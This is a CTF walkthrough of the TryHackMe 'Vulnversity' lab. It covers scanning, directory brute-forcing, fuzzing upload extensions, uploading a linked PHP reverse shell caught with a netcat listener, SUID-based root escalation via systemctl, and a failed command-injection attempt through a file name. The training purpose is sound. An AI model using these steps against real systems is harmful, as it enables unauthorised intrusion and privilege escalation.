---
title: "Vulnuniversity walkthrough"
date: 2020-05-21
tags: [ctf, tryhackme, vulnuniversity, walkthrough]
header:
  image: "/images/tryhackme/thm.png"
---

# Tryhackme - [Vulnversity](https://tryhackme.com/room/vulnversity)

## Reconnaissance

`nmap -A 10.10.101.118`
This will scan for the versions of services and also detects host OS using fingerprinting.
ports 21, 22, 139, 445, 3128, 3333 are open

`-n` option makes nmap to not resolve DNS. This can be found in the man page `man nmap`

The nmap output didnt predict the host OS. We can check again using `-O` option

## Locating directories using GoBuster

The website hosted on port 3333 has a lot of links but none of them work. Also, its made using wordpress, so we can use `wpscan`
Lets find more pages using gobuster
`gobuster dir -u http://10.10.101.118:3333 -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![gobuster]({{site.url}}{{site.baseurl}}/images/tryhackme/vulnversity/1-gobuster.png)

Looks like there is an upload option in /internal

## Compromize the webserver

Once the file to be uploaded is selected, it displays the file name before hitting the submit button. This can be used for command injection.

I tried to upload a .txt file and it said extension not allowed. .php also seems to be blocked

As suggested, we can use intruder to fuzz for valid extensions. We can also check for the form where it says *extension not allowed* to see if it says otherwise (this can be configured in optoins-grep extract). Also url encoding is enabled by default, but we dont need it since the fuzz object is not in url

![burp-intruder]({{site.url}}{{site.baseurl}}/images/tryhackme/vulnversity/2-burp-intruder.png)

Lets create the payload for php reverse shell using the [script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) as suggested and upload it. Make sure to check for all the **CHANGE THIS** comments and chenge them. We can go to /uploads page to see all the files we uploaded. Now the above script will be executed once we run it

before that, lets start a netcat listener using `nc -lvnp 9000`

This will give us a reverse shell

we can see the user 'www-data'
If we explore the directories, we can see that there is a user bill and we can find the flag in his home directory /home/bill

We can get a pretty shell by doing
```
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+z
stty raw -echo
fg
export TERM=xterm
```

## Privilege escalation

As suggested, we can look for files with SUID bit set using
```
find / -user root -perm 4000 2>/dev/null
```
/bin/systemctl will not have the SUID generally, so it is an interesting one
[gtfobins](https://gtfobins.github.io/gtfobins/systemctl/) has a privilege escalation prodcedure for systemctl. We can use it to create bash binary with SUID bit set. Once that is done, we can run bash with root privileges using `bash -p`

The flag is in root.txt in /root


I also wanted to try if there is a command injection vulnerability in /intenral page since it displays the name of the file. I was thinking if we can add a command to the file name and upload it, then when it runs, it would execute the command. But this is not the case.
I created a file `echo 'gg' > 'whoami;.phtml'` and uploaded it. But when I execute the file from /internal/uploads page, it just prints 'gg' without executing the whoami command. I guess they are not using `echo filename` directly

![try]({{site.url}}{{site.baseurl}}/images/tryhackme/vulnversity/3-try.png)
